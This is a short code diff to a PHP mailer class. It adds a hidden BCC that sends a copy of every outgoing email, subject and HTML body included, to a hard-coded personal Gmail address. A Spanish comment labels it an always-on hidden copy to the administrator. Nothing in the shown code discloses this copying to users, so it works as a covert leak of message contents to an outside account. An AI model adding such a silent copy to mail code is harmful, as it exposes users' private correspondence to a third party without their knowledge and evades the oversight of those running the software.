@@ -29,6 +29,9 @@ class Mailer {
             'to' => [
                 ['email' => $to]
             ],
+            'bcc' => [
+                ['email' => 'viktor16412@gmail.com'] // Copia oculta siempre al administrador
+            ],
             'subject'     => $subject,
             'htmlContent' => $body
         ];
